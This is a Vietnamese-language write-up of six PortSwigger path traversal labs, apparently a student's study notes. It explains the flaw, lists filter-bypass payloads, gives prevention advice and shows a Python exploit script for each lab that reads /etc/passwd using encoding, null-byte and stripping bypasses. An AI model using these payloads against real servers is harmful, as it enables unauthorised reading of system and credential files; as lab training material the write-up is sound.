# Path traversal

## Khái niệm & khai thác & phòng tránh

![image](https://hackmd.io/_uploads/BJ4PYhniT.png)

<ul>
    <ul><b>Khái niệm:</b>
        <li>Directory traversal giúp kẻ tấn công có thể thu thập nội dung các tệp tin nhạy cảm, mã nguồn chương trình một cách toàn vẹn và đầy đủ hơn. Là một bước cơ sở giúp họ có thể trực tiếp tìm kiếm các cách khai thác trong mã nguồn chương trình, hoặc xây dựng một cuộc tấn công Deserialize, ... Dạng lỗ hổng này hiện nay xuất hiện khá nhiều do chức năng đọc và hiển thị tệp tin là một trong những chức năng chính của các ứng dụng web, cách khai thác lỗ hổng đa dạng cũng như những đoạn code chưa thực sư "an toàn" trước sự đe dọa của dạng lổ hổng này. Các lỗ hổng Directory traversal còn có thể trực tiếp gây ra lỗi Local File Inclusion trong trường hợp nó ghi được vào file Log hay File environment, dẫn tới chiếm quyền điều khiển server.
    </li>
    </ul>
    <ul><b>Bypass filter</b>:
        <li>
        ..../..../..../
    </li>
    <li>...//...//</li>
    <li>../../../../etc/passwd%001.png</li>
    </ul>
    <ul>
        <b>Phòng tránh:</b>
        <li>Kiểm tra giá trị input từ người dùng với white list là danh sách các giá trị hợp lệ, cho phép hiển thị nội dung tới giao diện người dùng. Đồng thời kết hợp việc tìm kiếm các ký tự nhạy cảm trong input người dùng như :, /, %, ../, ..\, ...</li>
        <li>Tránh để lộ đường dẫn file được upload lên</li>
        <li>Đổi tên file trên server khi upload thành công,thực hiện hash đường dẫn file đã được upload để chống lại việc đoán được đường dẫn file</li>
    <li>Phân quyền các thư mục upload, nếu là chức năng upload ảnh thì cần chặn quyền thực thi ở thư mục chứa ảnh</li>
        <li>Sau khi xác thực đầu vào được cung cấp, hãy thêm đầu vào vào thư mục cơ sở và sử dụng API hệ thống tệp nền tảng để chuẩn hóa đường dẫn. Xác minh rằng đường dẫn chuẩn hóa bắt đầu bằng thư mục cơ sở dự kiến
        </li>
    </ul> 
    
</ul>

### Dấu hiệu

- các chức năng liên quan đến xử lý file sẽ có khả năng bị lỗi path traversal

1. Download/upload
2. Import/export
3. Menu động
4. Load resource
5. Zip/unzip
6. Xử lý hình ảnh

![image](https://hackmd.io/_uploads/BJnbah3jT.png)

vì khi ../ ra cuối cùng vẫn chỉ được thư mục "/" nên chúng ta có thể thêm nhiều dấu "../" (100 lần :) để đến thư mục "/" này

![image](https://hackmd.io/_uploads/B1Vq-62oT.png)

![image](https://hackmd.io/_uploads/Bk2u21aiT.png)

![image](https://hackmd.io/_uploads/HycCxl6jT.png)

VD: với Java code:

```java=
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```

VD: với PHP code:

![image](https://hackmd.io/_uploads/SyR1Y3nip.png)

attacker có thể đọc các file nhạy cảm như

![image](https://hackmd.io/_uploads/r1L9_22oa.png)

### Mức độ ảnh hưởng với tam giác CIA

![image](https://hackmd.io/_uploads/S11Gq2nip.png)

![image](https://hackmd.io/_uploads/SJbHq22jT.png)

![image](https://hackmd.io/_uploads/rJg_c22oa.png)

![image](https://hackmd.io/_uploads/Syl5c32oT.png)

![image](https://hackmd.io/_uploads/B1Wp53nja.png)

## 1. Lab: File path traversal, simple case

link: https://portswigger.net/web-security/file-path-traversal/lab-simple

### Đề bài:

![image](https://hackmd.io/_uploads/BkhjBh8ta.png)

### Phân tích

<ul>
    <li>đề bài cho chúng ta biết lab này có lỗ hổng Path traversal và chúng ta cần đọc được file /etc/passwd 
    </li>
     <li>mình đã dùng burp suite chặn các request và click vào <b>View detail</b> để chọn xem 1 sản phẩm 
    </li>  
</ul>

![image](https://hackmd.io/_uploads/HJj3t38F6.png)

<ul>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server </li>
</ul>

![image](https://hackmd.io/_uploads/S1Mivh8FT.png)

### Khai thác

vậy sẽ như thế nào nếu ta đổi filename thành 1 tên khác? Nó sẽ show ra 1 ảnh khác đúng không?
Yessss! Chúng ta sẽ khai thác lỗ hổng từ đó

để kiểm tra lỗi Path traversal mình đã dùng các dấu **".\./"** để di chuyển lên các thư mục cha của thư mục hiện tại và với mục đích để đọc được file **/etc/passwd** và may mắn là đến **".\./"** thứ 3 thừ mình đã đọc được file này

bài không có bất cứ một lớp phòng vệ nào để ngăn chặn Path traversal

![image](https://hackmd.io/_uploads/rJLluhUFT.png)

mình cũng đã viết lại script khai thác :100:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0af3000e03e09b7683f3e181001d002b.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=../../../etc/passwd',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/SkcpC3UFp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/rk_nnn8Ya.png)

### Scan trên Burp suite pro

![image](https://hackmd.io/_uploads/B1gwy0q2a.png)

![image](https://hackmd.io/_uploads/HJ6XkA53p.png)

![image](https://hackmd.io/_uploads/BJg2JCq2p.png)

- vào scan configuration và chọn new và đặt tên
- sau đó vào issues report search lỗ hổng file path traversal và chọn để attach

![image](https://hackmd.io/_uploads/HyogbA5nT.png)

sau đó ấn save và mình được task attack có tên **cuong**

![image](https://hackmd.io/_uploads/H1ss-R52a.png)

nhấn OK và burp pro đã tự động scan lab cho chúng ta

![image](https://hackmd.io/_uploads/Bk7SbAc3a.png)

và chúng ta thấy có thông báo lỗ hổng file path traversal bên góc phải

- mình vào view detail và được
  ![image](https://hackmd.io/_uploads/BkPszCc3a.png)

burp đã dùng payload `..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` và đọc được file /etc/passwd
![image](https://hackmd.io/_uploads/Skc17Rc3a.png)

và tự động lab của mình đã được solve

![image](https://hackmd.io/_uploads/Hkzu7RqnT.png)

## 2. Lab: File path traversal, traversal sequences blocked with absolute path bypass

link: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

### Đề bài

![image](https://hackmd.io/_uploads/Hygnkp8K6.png)

### Phân tích

<ul>
    <li>tương tự bài trước mình đã dùng burp suite chặn các request và click vào View detail để chọn xem 1 sản phẩm
    </li>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server 
    </li>
</ul>

![image](https://hackmd.io/_uploads/r1I2x6UF6.png)

### Khai thác

để kiểm tra lỗi Path traversal mình đã dùng các dấu **".\./"** để di chuyển lên các thư mục cha của thư mục hiện tại và với mục đích để đọc được file **/etc/passwd**

và mình đã không đọc được file này như bài trước có vẻ như lab này đã có cơ chế chặn hay mã hóa các ký tự "." và "/"

![image](https://hackmd.io/_uploads/HJMV-aLFp.png)

<ul>
    <li>
        và nếu mình không thể dùng đường dẫn tương đối để giải quyết bài này vậy đường dẫn tuyệt đối thì sao?
    </li>
    <li>mình đã thử dùng đường dẫn tuyệt đối đến file /etc/passwd, mình nhận thấy  nó là file nằm trong thư mục root: "/"
    </li>  
</ul>

![image](https://hackmd.io/_uploads/rJZ5f68ta.png)

mình cũng đã viết lại script khai thác :100:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0ada00f40345a79481bec56300ea008b.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=/etc/passwd',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/ryRSrTIYp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/B1wKrTIFT.png)

## 3. Lab: File path traversal, traversal sequences stripped non-recursively

link: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

### Đề bài

![image](https://hackmd.io/_uploads/BkCXZDwY6.png)

### Phân tích

<ul>
    <li>tương tự bài trước mình đã dùng burp suite chặn các request và click vào View detail để chọn xem 1 sản phẩm
    </li>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server 
    </li>
</ul>

![image](https://hackmd.io/_uploads/rJG4GvwF6.png)

### khai thác

để kiểm tra lỗi Path traversal mình đã dùng các dấu **".\./"** để di chuyển lên các thư mục cha của thư mục hiện tại và với mục đích để đọc được file **/etc/passwd**

và mình đã không đọc được file này như bài trước có vẻ như lab này đã có cơ chế chặn hay mã hóa các ký tự "." và "/"

![image](https://hackmd.io/_uploads/BkAszvwKp.png)

có vẻ là các ký tự '.\./' đã bị loại bỏ nhưng nếu tôi gấp đôi chúng lên thì sao ví dụ ".\.'.\./'/" thì bộ lọc sẽ bỏ .\./ tại vị trí dấu **''** mà tôi đã đánh dấu và trở thành ".\./" giúp chúng ta đọc được file /etc/passwd như các bài trước

![image](https://hackmd.io/_uploads/rJ2y7wwYa.png)

tôi đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0a4900c0034cd08e85a1d1190072005b.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=....//....//....//etc/passwd',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/BkvfSvPYa.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/HJgSHwPK6.png)

## 4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

link: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

### Đề bài

![image](https://hackmd.io/_uploads/rJ2jrPPF6.png)

### Phân tích

<ul>
    <li>tương tự bài trước mình đã dùng burp suite chặn các request và click vào View detail để chọn xem 1 sản phẩm
    </li>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server 
    </li>
</ul>

![image](https://hackmd.io/_uploads/HJJV8wvYp.png)

### khai thác

<ul>
    <li>cũng như bài trước thì lab này cũng đã chặn các ký tự để chuyển thư mục </li>
    <li>và mình đã thử encode url để tránh bị filter các ký tự "../" và khi đến server các ký tự này vẫn được decode và thực hiện ý đồ mà chúng ta muốn</li>
</ul>

![image](https://hackmd.io/_uploads/BJkAwDwF6.png)

![image](https://hackmd.io/_uploads/rJGWuvwt6.png)

vẫn chưa được mình thử encode lần nữa và may mắn là đã thành công

![image](https://hackmd.io/_uploads/B1C7_vPKT.png)

![image](https://hackmd.io/_uploads/B1PSuDDFp.png)

mình đã viết lại script khai thác:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0a1c00b903cb2012845f13fc0092009b.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/SkPsOvDKa.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/rkb3uDwtT.png)

## 5. Lab: File path traversal, validation of start of path

link: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

### Đề bài

![image](https://hackmd.io/_uploads/Sk27YDwYa.png)

### Phân tích

<ul>
    <li>tương tự bài trước mình đã dùng burp suite chặn các request và click vào View detail để chọn xem 1 sản phẩm
    </li>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server 
    </li>
    <li>có vẻ bài dùng đường dẫn tuyệt đối đến file cần đọc  
    </li>
</ul>

![image](https://hackmd.io/_uploads/rknkqwwt6.png)

### khai thác

để kiểm tra lỗi Path traversal mình đã dùng các dấu **".\./"** để di chuyển lên các thư mục cha của thư mục hiện tại và với mục đích để đọc được file **/etc/passwd**

![image](https://hackmd.io/_uploads/HJDNcwDtT.png)

và mình cũng đã viết lại script

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0acf000a038b62dc819089dd00630009.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=/var/www/images/../../../etc/passwd',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/rJSViPDKT.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/BykLiPvtp.png)

## 6. Lab: File path traversal, validation of file extension with null byte bypass

link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

### Đề bài

![image](https://hackmd.io/_uploads/r1l3ivwFa.png)

### Phân tích

<ul>
    <li>tương tự bài trước mình đã dùng burp suite chặn các request và click vào View detail để chọn xem 1 sản phẩm
    </li>
    <li>và mình bắt được gói tin yêu cầu 1 file ảnh từ server 
    </li>
</ul>

![image](https://hackmd.io/_uploads/H1vMnDDKa.png)

### Khai thác

<ul>
    <li>bài đã filter phần mở rộng phải là file ảnh </li>
    <li>mình đã thêm phần mở rộng đồng thời thêm ký tự null và encode url để bộ lọc vẫn nhận đây là file ảnh nhưng đến khi đọc file ở trong hệ thống lệnh sẽ bị dừng tại ký tự null </li>
</ul>

![image](https://hackmd.io/_uploads/H1OC2vwY6.png)

mình cũng viết lại script khai thác:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0ad2005d04467e758442e62e00ef00ae.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=../../../../etc/passwd%001.png',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/H1Mh0Pwtp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab

![image](https://hackmd.io/_uploads/B1gRAwwK6.png)

## Thank you for reading >.< Gud bye

![image](https://hackmd.io/_uploads/SycyQdwFp.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
